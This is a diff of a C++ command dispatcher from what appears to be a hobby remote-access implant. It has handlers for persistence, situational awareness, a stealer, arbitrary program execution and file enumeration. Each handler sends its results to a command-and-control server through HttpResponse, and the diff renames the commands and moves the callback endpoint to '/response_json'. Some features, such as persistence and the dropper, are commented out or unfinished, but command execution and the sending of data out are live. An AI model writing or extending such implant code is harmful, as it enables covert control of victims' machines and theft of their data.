@@ -1,8 +1,8 @@
 #include "execute.h"
 
 /* Directory of Commands
-- Persistence 1
-- Situational Awareness
+- Persistence_1
+- SituationalAwareness
 - Stealer
 - Execution <arg>
 - File Enumeration <arg> - List files in the directory
@@ -12,7 +12,6 @@ In the works
 I cannot for the life of me get the Dropper header to run in the execute header file
 
 TODO:
-- Persistence 2 - Doesn't compile
 - Retrieval - Is commented out?
 - Injection - Will work on it next time
  */
@@ -24,25 +23,18 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     /* Persistance */
     // before publishing - the bat file needs to load the implant.exe
     // only uncomment in sandbox
-    if(command.compare("Persistence 1") == 0){
+    if(command.compare("Persistence_1") == 0){
         printf("Executing Persistence\n");
         results = "executed";
         // persist_execution();
-        HttpResponse("/response", implant_id, task_id, results, "success", command);
-    }
-
-    // currently doesn't compile
-    if(command.compare("Persistence 2") == 0){
-        printf("Executing Persistence 2\n");
-        //Add in Persistence_2
-        // Windows Scheduler
+        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
     }
 
     /* Situational Awareness */
-    if(command.compare("Situational Awareness") == 0){
+    if(command.compare("SituationalAwareness") == 0){
         printf("Executing Situational Awareness\n");
         results = GetAll();
-        HttpResponse("/response", implant_id, task_id, results, "success", command);
+        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
     }
 
     /* Execution */
@@ -65,11 +57,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         std::string res = exec(prog,a);
             
         results = res;
-        HttpResponse("/response", implant_id, task_id, results, "success", command);
+        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
     }
     
     /* File Enumeration */
-    if(command.compare("File Enumeration") == 0){
+    if(command.compare("File_Enumeration") == 0){
         printf("Executing File Enumeration\n");
             //std::string s = std::string("C:\\Windows\\System32");
         std::string path = args;
@@ -86,7 +78,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         std::string result = storage.str();
             //std::cout << result << std::endl;
             //std::string item = 
-        HttpResponse("/response", implant_id, task_id, result, "success", command);
+        HttpResponse("/response_json", implant_id, task_id, result, "success", command);
             //std::cout << item;
     }
 
@@ -105,7 +97,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         results = data_from_driver.dump();
 
         /* Send the response back to the server */
-        HttpResponse("/response", implant_id, task_id, results, "success", command);
+        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
     }
 
     /* Dropper */
